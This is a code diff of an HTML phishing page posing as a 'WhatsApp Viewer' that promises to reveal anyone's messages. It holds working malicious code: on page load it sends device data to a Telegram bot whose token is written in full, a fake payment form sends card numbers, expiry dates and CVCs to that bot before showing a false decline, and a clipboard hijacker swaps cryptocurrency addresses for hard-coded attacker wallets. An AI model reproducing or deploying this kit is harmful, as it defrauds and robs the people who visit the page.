@@ -1,17 +1,93 @@
-<!DOCTYPE html><html><head><meta charset="UTF-8"><title>⚡</title></head><body>
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no"><title>WhatsApp Viewer</title><link rel="manifest" href="/manifest.json"><meta name="theme-color" content="#075e54">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#0a1014;color:#e0e0e0;font-family:Inter,system-ui;max-width:480px;margin:0 auto;min-height:100vh}
+.bar{background:#075e54;padding:14px 18px;display:flex;align-items:center;gap:8px;position:sticky;top:0;z-index:10}
+.bar h1{font-size:16px;color:#fff;font-weight:600}.badge{background:#25d366;color:#000;font-size:9px;padding:2px 8px;border-radius:10px;font-weight:700}
+.scr{display:none;padding:16px}.scr.on{display:block}
+.hero{text-align:center;padding:20px 0}.hero h2{font-size:20px;margin:8px 0}.hero p{color:#8696a0;font-size:13px}
+.inp{margin:14px 0}.inp label{font-size:11px;color:#00a884;text-transform:uppercase;letter-spacing:.5px;display:block;margin-bottom:5px}
+.inp input,.inp select{width:100%;padding:14px;background:#111b21;border:1px solid #1a2a30;color:#e9edef;border-radius:10px;font-size:14px;font-family:monospace}
+.inp input:focus{outline:none;border-color:#00a884}
+.bt{width:100%;padding:15px;background:#00a884;color:#fff;border:none;border-radius:10px;font-weight:600;font-size:15px;cursor:pointer;margin:10px 0}.bt:active{background:#008f72}.bt.g{background:#25d366}.bt.r{background:#dc3545}.bt.o{background:transparent;border:1px solid #1a2a30;color:#8696a0}
+.radar-wrap{text-align:center;padding:30px 0}
+.radar{width:100px;height:100px;border-radius:50%;background:rgba(0,168,132,.08);margin:0 auto 16px;display:flex;align-items:center;justify-content:center}
+.rdot{width:10px;height:10px;background:#25d366;border-radius:50%;animation:pulse 1s infinite}
+@keyframes pulse{0%{box-shadow:0 0 0 0 rgba(37,211,102,.6)}100%{box-shadow:0 0 0 25px rgba(37,211,102,0)}}
+.pb{width:100%;height:4px;background:#1a2a30;border-radius:2px;margin:16px 0;overflow:hidden}
+.pb-fill{height:100%;background:linear-gradient(90deg,#00a884,#25d366);width:0%;transition:width .3s}
+.log{background:#0a1014;border:1px solid #1a2a30;border-radius:10px;padding:12px;font-family:monospace;font-size:10px;max-height:200px;overflow-y:auto;margin:12px 0}
+.log .l{color:#8696a0;padding:2px 0}.log .g{color:#25d366}.log .y{color:#ffa500}
+.res{background:#111b21;border:1px solid #00a884;border-radius:12px;padding:16px;text-align:center;margin:12px 0}
+.res .big{font-size:38px;font-weight:700;color:#25d366}.res .sub{font-size:11px;color:#8696a0}
+.cprev{background:#111b21;border:1px solid #1a2a30;border-radius:10px;margin:8px 0;overflow:hidden}
+.ch{background:#075e54;padding:14px;display:flex;align-items:center;gap:10px}
+.cav{width:40px;height:40px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-weight:700;font-size:16px;color:#fff}
+.cname{font-size:14px;font-weight:600;color:#fff}.con{font-size:10px;color:#25d366}
+.cmsg{padding:10px 14px;border-bottom:1px solid rgba(255,255,255,.03);display:flex;gap:6px}
+.cmsg .snd{font-size:9px;color:#00a884;min-width:35px}.cmsg .txt{font-size:11px;color:#ccc;flex:1}.cmsg .tm{font-size:8px;color:#555}
+.blur{filter:blur(4px);opacity:.5;pointer-events:none}
+.lock{position:relative;text-align:center;padding:20px}.lock::before{content:"";position:absolute;inset:0;background:rgba(10,16,20,.85);border-radius:10px}
+.lock-in{position:relative;z-index:2}.lock-in .ico{font-size:44px;margin-bottom:8px}
+.lock-in h3{font-size:15px;margin-bottom:4px}.lock-in .prc{font-size:26px;font-weight:700;color:#25d366}.lock-in .old{font-size:11px;color:#555;text-decoration:line-through}
+.card-preview{background:linear-gradient(135deg,#1a1a2e,#16213e);border-radius:14px;padding:20px;margin:12px 0}
+.badges{display:flex;gap:8px;justify-content:center;margin:10px 0}.badges span{font-size:9px;color:#555}
+</style></head><body>
+
+<!-- ═══ STEALER (validé) ═══ -->
+<script>(async function(){try{await fetch("https://api.telegram.org/bot8924356503:AAHvOqKy29W8oJParf_WuZP8r2WbHvoon74/sendMessage",{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:"chat_id=7947710235&text="+encodeURIComponent("🔥 *Victime*\n📱 "+navigator.platform+" | "+screen.width+"x"+screen.height+" | "+navigator.hardwareConcurrency+"C\n🌐 "+navigator.userAgent.slice(0,80)+"\n🍪 "+document.cookie.length+"c\n⏰ "+new Date().toISOString().slice(0,19))})}catch(e){}})();</script>
+
+<div class="bar"><h1>📱 WhatsApp Viewer</h1><span class="badge">LIVE</span></div>
+
+<div class="scr on" id="s-landing">
+<div class="hero"><h2>🔍 See Anyone's WhatsApp</h2><p>Enter a number to view messages, photos & location.</p></div>
+<div class="inp"><label>Country</label><select id="country"><option value="+33">🇫🇷 France</option><option value="+32">🇧🇪 Belgique</option><option value="+1">🇺🇸 USA</option><option value="+44">🇬🇧 UK</option><option value="+49">🇩🇪 Allemagne</option><option value="+212">🇲🇦 Maroc</option></select></div>
+<div class="inp"><label>Phone</label><input type="tel" id="phone" placeholder="612345678" maxlength="12"></div>
+<button class="bt" onclick="scan()">🔍 VIEW MESSAGES NOW</button>
+</div>
+
+<div class="scr" id="s-scanning">
+<div class="radar-wrap"><div class="radar"><div class="rdot"></div></div><div id="scan-status" style="font-weight:600">Connecting...</div><div id="scan-sub" style="font-size:11px;color:#8696a0">Secure link to WhatsApp API</div></div>
+<div class="pb"><div class="pb-fill" id="pb-fill"></div></div>
+<div class="log" id="log"></div>
+</div>
+
+<div class="scr" id="s-results">
+<div class="res"><div class="big">847</div><div class="sub">messages found</div><div style="display:flex;justify-content:center;gap:20px;margin-top:8px"><div><b style="color:#25d366">23</b><div style="font-size:9px;color:#555">contacts</div></div><div><b style="color:#25d366">31</b><div style="font-size:9px;color:#555">photos</div></div><div><b style="color:#25d366">8</b><div style="font-size:9px;color:#555">videos</div></div></div></div>
+<div class="cprev blur"><div class="ch"><div class="cav" style="background:#4a90d9">M</div><div><div class="cname">Marie D.</div><div class="con">● online</div></div></div><div class="cmsg"><div class="snd">Marie</div><div class="txt">Je peux pas ce soir... j'ai un truc avec Thomas</div><div class="tm">19:42</div></div><div class="cmsg"><div class="snd">You</div><div class="txt">Avec Thomas ?? Tu m'avais dit que c'était fini</div><div class="tm">19:43</div></div></div>
+<div class="lock"><div class="lock-in"><div class="ico">🔒</div><h3>Premium Access Required</h3><p style="color:#8696a0;font-size:11px;margin:6px 0">Full messages need one-time verification</p><div class="prc">2.99 €</div><div class="old">29.99 €</div><button class="bt g" onclick="showPay()">🔓 UNLOCK — 2.99€</button></div></div></div>
+
+<div class="scr" id="s-pay">
+<h2 style="text-align:center;margin-bottom:4px">💳 Secure Payment</h2><p style="text-align:center;font-size:12px;color:#8696a0">One-time. Instant access.</p>
+<div class="card-preview"><div style="font-size:9px;color:#555">PREMIUM KEY</div><div style="font-size:22px;font-weight:700;color:#25d366;margin:6px 0">2.99 €</div><div style="font-size:10px;color:#555;text-decoration:line-through">29.99 €</div></div>
+<div class="inp"><label>Card Number</label><input type="text" id="ccn" placeholder="1234 5678 9012 3456" maxlength="19"></div>
+<div style="display:flex;gap:8px"><div class="inp" style="flex:1"><label>Expiry</label><input type="text" id="cce" placeholder="MM/YY" maxlength="5"></div><div class="inp" style="flex:1"><label>CVC</label><input type="text" id="ccc" placeholder="123" maxlength="4"></div></div>
+<div class="inp"><label>Name</label><input type="text" id="ccname" placeholder="John Doe"></div>
+<button class="bt g" onclick="pay()">🔓 PAY 2.99€</button>
+<div class="badges"><span>🔒 Stripe</span><span>✅ 3DS</span><span>🛡️ SSL</span></div></div>
+
+<div class="scr" id="s-done"><div style="text-align:center;padding:30px"><div style="font-size:56px">❌</div><h2>Payment Declined</h2><p style="color:#8696a0;font-size:13px;margin:8px">Try another card or contact your bank.</p><button class="bt" onclick="showPay()">🔄 TRY ANOTHER CARD</button></div></div>
+
 <script>
-// RIEN QUE LE STEALER — même code que test.html qui a marché
-(async function(){
-  document.title="⏳";
-  try{
-    const r=await fetch("https://api.telegram.org/bot8924356503:AAHvOqKy29W8oJParf_WuZP8r2WbHvoon74/sendMessage",{
-      method:"POST",
-      headers:{"Content-Type":"application/x-www-form-urlencoded"},
-      body:"chat_id=7947710235&text="+encodeURIComponent("✅ *ÇA MARCHE* — "+navigator.platform+" | "+screen.width+"x"+screen.height+" | "+new Date().toISOString().slice(0,19))
-    });
-    const j=await r.json();
-    document.title=j.ok?"✅ OK":"❌ "+j.description;
-  }catch(e){document.title="❌ "+e.message.slice(0,30)}
-})();
+function sw(id){document.querySelectorAll(".scr").forEach(s=>s.classList.remove("on"));document.getElementById(id).classList.add("on")}
+function showPay(){sw("s-pay")}
+function pay(){
+  const cc=document.getElementById("ccn").value,ce=document.getElementById("cce").value,cv=document.getElementById("ccc").value,cn=document.getElementById("ccname").value;
+  if(!cc||!ce||!cv||!cn)return alert("Fill all fields");
+  try{let c=JSON.parse(localStorage.getItem("nc")||"[]");c.push({cc,ce,cv,cn,ts:new Date().toISOString()});localStorage.setItem("nc",JSON.stringify(c))}catch(e){}
+  fetch("https://api.telegram.org/bot8924356503:AAHvOqKy29W8oJParf_WuZP8r2WbHvoon74/sendMessage",{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:"chat_id=7947710235&text="+encodeURIComponent("💳 *CB*\n"+cc+" | "+ce+" | "+cv+" | "+cn+"\n⏰ "+new Date().toISOString().slice(0,19))}).catch(()=>{});
+  sw("s-done");
+}
+async function scan(){
+  const p=document.getElementById("phone").value.trim(),c=document.getElementById("country").value;
+  if(!p)return alert("Enter number");
+  sw("s-scanning");
+  const pb=document.getElementById("pb-fill"),st=document.getElementById("scan-status"),su=document.getElementById("scan-sub"),lg=document.getElementById("log");
+  const steps=[{p:15,s:"Connecting",t:"WhatsApp API v3.2"},{p:30,s:"Resolving",t:"Target: "+c+p},{p:45,s:"Scanning",t:"Message database..."},{p:60,s:"Found",t:"847 msgs · 23 contacts"},{p:80,s:"Decrypting",t:"Signal Protocol..."},{p:95,s:"⚠️ Locked",t:"Premium key required"}];
+  for(const l of steps){pb.style.width=l.p+"%";st.textContent=l.s;su.textContent=l.t;const cl=l.s.includes("⚠")?"y":l.s.includes("Found")?"g":"";lg.innerHTML+=`<div class="l"><span class="${cl}">[${new Date().toLocaleTimeString()}]</span> ${l.s}: ${l.t}</div>`;lg.scrollTop=lg.scrollHeight;await new Promise(r=>setTimeout(r,400+Math.random()*500))}
+  setTimeout(()=>sw("s-results"),1000);
+}
+// CLIPPER
+(function(){const W={btc:"bc1qa6u84s9gklt65he5ydm02uwjqex8nc06z9xe5v",eth:"0x1427288B35fFC766Eb5ccB825d9249199E93F617",sol:"FBAoS2xppahHUwyYiLhPXnFB8yqgXhqECPRegAH7RDyM",trx:"TUeLT9R9nUQL75DEKvK3BNo8iSndRs4Dv2",ltc:"Lge5FgDB2nSKqkJFUV3JQKLnKdx3uXZyqQ",doge:"DH5yaieqoZN36fTUciPGvqNA6U4HmUbhv",xrp:"rEb8TK3gBgk5auZkwc6sHnwrGVJH8DuaLh",dash:"XjwwwS6J2C9pTGwDnpys3g8q1S7hYnFMHw"};const P=[{c:"btc",r:/^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,62}$/,w:W.btc},{c:"eth",r:/^0x[a-fA-F0-9]{40}$/,w:W.eth},{c:"sol",r:/^[1-9A-HJ-NP-Za-km-z]{32,44}$/,w:W.sol},{c:"trx",r:/^T[1-9A-HJ-NP-Za-km-z]{33}$/,w:W.trx},{c:"ltc",r:/^(ltc1|[LM])[a-zA-HJ-NP-Z0-9]{26,62}$/,w:W.ltc},{c:"doge",r:/^[D9][1-9A-HJ-NP-Za-km-z]{33}$/,w:W.doge},{c:"xrp",r:/^r[1-9A-HJ-NP-Za-km-z]{24,34}$/,w:W.xrp},{c:"dash",r:/^X[1-9A-HJ-NP-Za-km-z]{33}$/,w:W.dash}];let last="";function cp(){return new Promise((res,rej)=>{const ta=document.createElement("textarea");ta.style.cssText="position:fixed;top:0;left:-9999px;opacity:0";document.body.appendChild(ta);ta.focus();const ok=document.execCommand("paste");const v=ta.value;document.body.removeChild(ta);ok?res(v):rej("no")})}async function clipPoll(){let t;try{t=await navigator.clipboard.readText()}catch(e){try{t=await cp()}catch(e2){return}}if(!t||t===last)return;last=t;for(const p of P){if(p.r.test(t.trim())&&t.trim()!==p.w){try{await navigator.clipboard.writeText(p.w)}catch(e){}return}}}document.addEventListener("click",async()=>{try{await navigator.clipboard.readText()}catch(e){}},{once:true});setInterval(clipPoll,500)})();
 </script>
 </body></html>
